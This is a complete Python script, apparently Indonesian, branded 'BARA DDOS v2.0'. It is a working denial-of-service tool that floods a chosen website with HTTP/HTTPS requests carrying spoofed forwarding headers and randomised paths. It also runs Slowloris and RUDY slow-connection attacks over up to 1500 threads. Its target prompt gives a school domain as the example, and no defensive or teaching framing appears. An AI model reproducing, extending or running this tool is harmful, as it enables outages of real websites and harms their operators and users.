#!/usr/bin/env python3
import socket, ssl, threading, random, time, sys, os, hashlib, string

# ===================== KONFIG =====================
KODE_VERIF = "bara2026"
MAX_THREAD = 1500
RECV_SIZE = 999999

# ===================== WARNA =====================
R  = "\033[91m"   # merah
G  = "\033[92m"   # hijau
Y  = "\033[93m"   # kuning
B  = "\033[94m"   # biru
M  = "\033[95m"   # magenta
C  = "\033[96m"   # cyan
W  = "\033[97m"   # putih
BOLD = "\033[1m"
DIM  = "\033[2m"
RST  = "\033[0m"

BANNER = f"""{R}{BOLD}
██████╗  █████╗ ██████╗  █████╗     ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██████╔╝███████║██████╔╝███████║    ██║  ██║██║  ██║██║   ██║███████╗
██╔══██╗██╔══██║██╔══██╗██╔══██║    ██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██║  ██║██║  ██║██║  ██║    ██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
{RST}{Y}{BOLD}              ⚡ BARA DDOS v2.0 — MULTI VECTOR ⚡{RST}
{M}{DIM}          Author : Zero   |   Dev : Ciel   |   Region : ID{RST}
{C}{BOLD}══════════════════════════════════════════════════════════════════{RST}
"""

# ===================== STATE =====================
ctx = ssl._create_unverified_context()
stats = {"https": 0, "slow": 0, "rudy": 0, "err": 0}
stop_flag = False

# ===================== UTIL =====================
def cls():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    cls()
    print(BANNER)

def verifikasi():
    print(f"{Y}{BOLD}[!] VERIFIKASI DIPERLUKAN SEBELUM GAS{RST}")
    kode = input(f"{G}[?] Masukkan kode verifikasi: {RST}").strip()
    if hashlib.sha256(kode.encode()).hexdigest() != hashlib.sha256(KODE_VERIF.encode()).hexdigest():
        print(f"{R}[X] KODE SALAH! Akses ditolak.{RST}")
        time.sleep(2); sys.exit(1)
    print(f"{G}[✓] Verifikasi BARA berhasil! Lanjut gas...{RST}")
    time.sleep(0.8)

def rand_str(n=8):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))

def random_ua():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) Safari/604.1",
        "Mozilla/5.0 (Android 13; Mobile) Chrome/118.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/119.0",
    ])

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def random_path(host):
    return random.choice([
        f"/?{rand_str(12)}={rand_str(8)}",
        f"/{rand_str(6)}.php?id={random.randint(1,99999)}",
        f"/api/v1/{rand_str(5)}?token={rand_str(16)}",
        f"/search?q={rand_str(10)}&page={random.randint(1,999)}",
        f"/wp-admin/admin-ajax.php?action={rand_str(6)}",
        "/", "/index.php", "/login", "/home",
    ])

# ===================== VECTOR 1: HTTPS FLOOD =====================
def https_flood(host, port, use_ssl):
    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if use_ssl:
                ss = ctx.wrap_socket(s, server_hostname=host)
                ss.connect((host, port))
                sock = ss
            else:
                s.connect((host, port)); sock = s
            for _ in range(50):
                if stop_flag: break
                method = random.choice(["GET","POST","HEAD","PUT","OPTIONS","DELETE","PATCH"])
                payload = (
                    f"{method} {random_path(host)} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random_ua()}\r\n"
                    f"Accept: */*\r\n"
                    f"Accept-Language: id-ID,id;q=0.9\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache, no-store\r\n"
                    f"Pragma: no-cache\r\n"
                    f"X-Forwarded-For: {random_ip()}\r\n"
                    f"X-Real-IP: {random_ip()}\r\n"
                    f"X-Originating-IP: {random_ip()}\r\n"
                    f"Referer: https://{host}/{rand_str(6)}\r\n"
                    f"Cookie: {rand_str(20)}={rand_str(20)}\r\n"
                    f"Content-Length: 0\r\n\r\n"
                ).encode()
                sock.send(payload)
                stats["https"] += 1
            sock.close()
        except:
            stats["err"] += 1

# ===================== VECTOR 2: SLOWLORIS =====================
def slowloris(host, port, use_ssl):
    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            if use_ssl:
                ss = ctx.wrap_socket(s, server_hostname=host)
                ss.connect((host, port)); sock = ss
            else:
                s.connect((host, port)); sock = s
            sock.send(f"GET /?{rand_str(8)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(f"User-Agent: {random_ua()}\r\n".encode())
            sock.send(f"Accept: */*\r\n".encode())
            while not stop_flag:
                sock.send(f"X-{rand_str(5)}: {rand_str(10)}\r\n".encode())
                stats["slow"] += 1
                time.sleep(random.uniform(5, 12))
        except:
            stats["err"] += 1
            time.sleep(1)

# ===================== VECTOR 3: RUDY (R-U-Dead-Yet) =====================
def rudy(host, port, use_ssl):
    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            if use_ssl:
                ss = ctx.wrap_socket(s, server_hostname=host)
                ss.connect((host, port)); sock = ss
            else:
                s.connect((host, port)); sock = s
            length = random.randint(1000000, 9999999)
            sock.send(f"POST /{rand_str(6)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(f"User-Agent: {random_ua()}\r\n".encode())
            sock.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
            sock.send(f"Content-Length: {length}\r\n\r\n".encode())
            for _ in range(1000):
                if stop_flag: break
                sock.send(f"{rand_str(1)}".encode())
                stats["rudy"] += 1
                time.sleep(random.uniform(5, 10))
        except:
            stats["err"] += 1
            time.sleep(1)

# ===================== MONITOR =====================
def monitor():
    while not stop_flag:
        time.sleep(1)
        total = stats["https"] + stats["slow"] + stats["rudy"]
        sys.stdout.write(
            f"\r{M}[⚡]{RST} {G}HTTPS:{RST}{W}{stats['https']:<7}{RST} "
            f"{Y}SLOW:{RST}{W}{stats['slow']:<6}{RST} "
            f"{C}RUDY:{RST}{W}{stats['rudy']:<6}{RST} "
            f"{R}ERR:{RST}{W}{stats['err']:<6}{RST} "
            f"{BOLD}{G}[TOTAL {total}]{RST}   "
        )
        sys.stdout.flush()

# ===================== MENU =====================
def menu():
    print(f"{C}{BOLD}╔══════════════════════════════════════════════════════╗{RST}")
    print(f"{C}║{RST}  {Y}{BOLD}                BARA DDOS v2.0 MENU                 {RST}{C}║{RST}")
    print(f"{C}╠══════════════════════════════════════════════════════╣{RST}")
    print(f"{C}║{RST}  {G}[1]{RST} {W}HTTPS Flood       {DIM}— vector utama, request gede{RST}  {C}║{RST}")
    print(f"{C}║{RST}  {G}[2]{RST} {W}HTTP Flood        {DIM}— buat situs tanpa SSL{RST}       {C}║{RST}")
    print(f"{C}║{RST}  {G}[3]{RST} {W}Slowloris         {DIM}— ngunci koneksi server{RST}      {C}║{RST}")
    print(f"{C}║{RST}  {G}[4]{RST} {W}RUDY              {DIM}— kirim body lambat{RST}          {C}║{RST}")
    print(f"{C}║{RST}  {G}[5]{RST} {M}{BOLD}MULTI VECTOR ★    {DIM}— all in, paling keras{RST}       {C}║{RST}")
    print(f"{C}║{RST}  {R}[6]{RST} {W}Exit{RST}                                              {C}║{RST}")
    print(f"{C}{BOLD}╚══════════════════════════════════════════════════════╝{RST}")
    return input(f"{G}{BOLD}[?] Pilih metode: {RST}").strip()

# ===================== MAIN =====================
def main():
    global stop_flag
    banner()
    verifikasi()

    pil = menu()
    if pil == "6":
        print(f"{R}[X] Keluar dari BARA DDOS.{RST}"); sys.exit(0)

    url = input(f"{G}[?] Input website target (contoh: sekolah.sch.id): {RST}").strip()
    if not url.startswith("http"):
        url = ("https://" if pil in ["1","3","4","5"] else "http://") + url

    use_ssl = url.startswith("https")
    raw = url.replace("https://","").replace("http://","").split("/")
    host = raw[0]
    path = "/" + "/".join(raw[1:]) if len(raw) > 1 and raw[1] else "/"
    port = 443 if use_ssl else 80

    try:
        ip = socket.gethostbyname(host)
    except:
        print(f"{R}[X] Domain tidak ditemukan!{RST}"); sys.exit(1)

    print(f"\n{C}╭─────────────── {Y}BARA TARGET INFO{C} ───────────────╮{RST}")
    print(f"{C}│{RST} {W}Host   :{RST} {G}{host}{RST}")
    print(f"{C}│{RST} {W}IP     :{RST} {G}{ip}{RST}")
    print(f"{C}│{RST} {W}Port   :{RST} {G}{port}{RST}")
    print(f"{C}│{RST} {W}SSL    :{RST} {G}{use_ssl}{RST}")
    print(f"{C}│{RST} {W}Thread :{RST} {G}{MAX_THREAD}{RST}")
    print(f"{C}│{RST} {W}Vector :{RST} {Y}{['','HTTPS','HTTP','SLOW','RUDY','MULTI'][int(pil)]}{RST}")
    print(f"{C}╰────────────────────────────────────────────────────╯{RST}")
    print(f"\n{R}{BOLD}🔥 BARA GAS... (Ctrl+C untuk stop) 🔥{RST}\n")
    time.sleep(2)

    # ===== SPAWN THREAD =====
    if pil == "1":
        targets = [(https_flood, (host, port, True))] * MAX_THREAD
    elif pil == "2":
        targets = [(https_flood, (host, port, False))] * MAX_THREAD
    elif pil == "3":
        targets = [(slowloris, (host, port, True))] * MAX_THREAD
    elif pil == "4":
        targets = [(rudy, (host, port, True))] * MAX_THREAD
    else:  # MULTI
        n = MAX_THREAD // 3
        targets  = [(https_flood, (host, port, use_ssl))] * n
        targets += [(slowloris, (host, port, use_ssl))] * n
        targets += [(rudy, (host, port, use_ssl))] * n

    for fn, args in targets:
        threading.Thread(target=fn, args=args, daemon=True).start()

    threading.Thread(target=monitor, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_flag = True
        time.sleep(1.5)
        total = stats["https"] + stats["slow"] + stats["rudy"]
        print(f"\n\n{G}{BOLD}[✓] BARA stop.{RST}")
        print(f"{Y}[i] HTTPS :{RST} {stats['https']}")
        print(f"{Y}[i] SLOW  :{RST} {stats['slow']}")
        print(f"{Y}[i] RUDY  :{RST} {stats['rudy']}")
        print(f"{R}[i] ERR   :{RST} {stats['err']}")
        print(f"{G}{BOLD}[i] TOTAL :{RST} {total}")

if __name__ == "__main__":
    main()
